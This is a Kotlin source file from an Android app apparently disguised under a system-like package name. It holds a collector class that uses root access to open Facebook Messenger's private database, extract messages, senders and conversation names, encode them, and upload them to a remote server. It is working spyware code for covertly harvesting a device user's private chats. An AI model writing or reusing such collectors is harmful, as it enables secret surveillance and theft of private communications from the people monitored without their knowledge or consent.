package com.android.services.logs.collectors.im

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import com.android.services.db.entities.FacebookRooted
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.RootPermission.acquireFacebookDatabaseFilePermission
import com.android.services.util.logException
import com.android.services.util.logVerbose
import org.json.JSONObject
import java.util.*

class FacebookRootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncFacebook) {
            try {
                val lineList = retrieveFacebookMessages(context, localDatabaseSource)
                if (lineList.isNotEmpty()) {
                    val startDate = lineList[lineList.size - 1].date
                    val endDate = lineList[0].date
                    val mFacebookSender = RemoteServerHelper(
                        context,
                        AppConstants.FACEBOOK_ROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    mFacebookSender.upload(lineList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.FACEBOOK_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.FACEBOOK_ROOTED_TYPE} Sync is Off")
        }
    }

    private fun retrieveFacebookMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
    ): List<FacebookRooted> {
        var facebookList = ArrayList<FacebookRooted>()
        try {
            acquireFacebookDatabaseFilePermission()
            val sqLiteDatabase =
                SQLiteDatabase.openDatabase(AppConstants.DB_FACEBOOK_PATH + "threads_db2",
                    null,
                    SQLiteDatabase.OPEN_READONLY)
            val selection: String?
            val selectionArgs: Array<String>?
            val since: String
            val maxTimeStamp = localDatabaseSource.selectFacebookRootedMaxTimeStamp() ?: "0"
            since = maxTimeStamp.toString()

            if (since.isNotEmpty()) {
                selection = String.format("%s > ?", "timestamp_ms")
                selectionArgs = arrayOf(since)
            } else {
                selection = null
                selectionArgs = null
            }

            val c = sqLiteDatabase.query("messages",
                null,
                selection,
                selectionArgs,
                null,
                null,
                "timestamp_ms DESC")
            if (c != null) {
                while (c.moveToNext()) {
                    try {
                        val messageType = c.getString(c.getColumnIndex("msg_type"))
                        if (messageType == "-1") continue
                        val messageId = c.getString(c.getColumnIndex("msg_id"))
                        val conversationId = c.getString(c.getColumnIndex("thread_key"))
                        val senderName = JSONObject(c.getString(c.getColumnIndex("sender")))
                            .getString("name")
                        val senderObject = JSONObject(c.getString(c.getColumnIndex("sender")))
                        val userKey = senderObject.getString("user_key")
                        val senderId = userKey.replace("FACEBOOK:", "")
                        val timestamp = c.getString(c.getColumnIndex("timestamp_ms"))
                        val time = timestamp.toLong()
                        var type = "incoming"
                        var message: String
                        val duration = ""
                        val isCall = "0"
                        val conIdSplit = conversationId.split(":").toTypedArray()
                        if (messageType == "9") {
                            continue
                        } else {
                            message = c.getString(c.getColumnIndex("text"))
                            if (message == null) continue
                            if (conIdSplit.size == 3 && senderId == conIdSplit[2]) type = "outgoing"
                        }
                        var conversationName = ""
                        if (conversationId.contains("GROUP")) {
                            val cur = sqLiteDatabase.query("threads", arrayOf("name"),
                                "thread_key=?", arrayOf(conversationId), null, null, null)
                            if (cur != null) {
                                if (cur.moveToFirst()) conversationName = cur.getString(0)
                                cur.close()
                            }
                        } else {
                            val cur = sqLiteDatabase.query("thread_users",
                                arrayOf("name"),
                                "user_key=?",
                                arrayOf("FACEBOOK:" + conIdSplit[1]),
                                null,
                                null,
                                null)
                            if (cur != null) {
                                if (cur.moveToFirst()) conversationName = cur.getString(0)
                                cur.close()
                            }
                        }

                        val facebookRooted = FacebookRooted()
                        facebookRooted.apply {
                            this.conversationId = conversationId
                            this.conversationName = conversationName
                            this.message = AppUtils.convertStringToBase64(message)
                            this.type = type
                            this.senderName = senderName
                            this.senderId = conversationId
                            this.messageDatetime = AppUtils.formatDate(timestamp)
                            this.messageId = messageId
                            this.timeStamp = time
                            this.date = AppUtils.getDate(time)
                            this.status = 0
                        }
                        facebookList.add(facebookRooted)
                    } catch (e: Exception) {
                        logVerbose(
                            "${AppConstants.FACEBOOK_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                            throwable = e
                        )
                    }
                }
                c.close()
            }
            sqLiteDatabase.close()
            logVerbose("${AppConstants.FACEBOOK_ROOTED_TYPE} rooted list = $facebookList")
            if (facebookList.isNotEmpty())
                localDatabaseSource.insertFacebookRooted(facebookList)
            localDatabaseSource.selectFacebookRooted {
                facebookList = it as ArrayList<FacebookRooted>
            }
            logVerbose("${AppConstants.FACEBOOK_ROOTED_TYPE} selected list = $facebookList")
        } catch (e: Exception) {
            logVerbose(
                "${AppConstants.FACEBOOK_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                throwable = e
            )
        }
        return facebookList
    }
}